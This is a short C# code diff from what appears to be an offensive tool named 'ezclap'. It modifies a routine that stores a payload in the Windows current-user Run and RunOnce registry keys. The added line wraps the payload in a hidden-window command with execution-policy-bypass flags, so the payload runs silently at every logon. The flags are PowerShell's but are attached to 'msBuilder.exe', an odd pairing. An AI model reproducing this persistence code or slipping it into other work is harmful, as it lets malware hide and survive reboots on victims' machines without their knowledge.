@@ -18,7 +18,9 @@ namespace ezclap
             /*
              *  Description: Add RunKey registry key with payload  
              */
-            
+
+            payload = "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payload;
+
             Utils.setHKCUSubKey(RegistryKeys.RunKey, names[0], payload);
             Utils.setHKCUSubKey(RegistryKeys.RunOnceKey, names[1], payload);
 
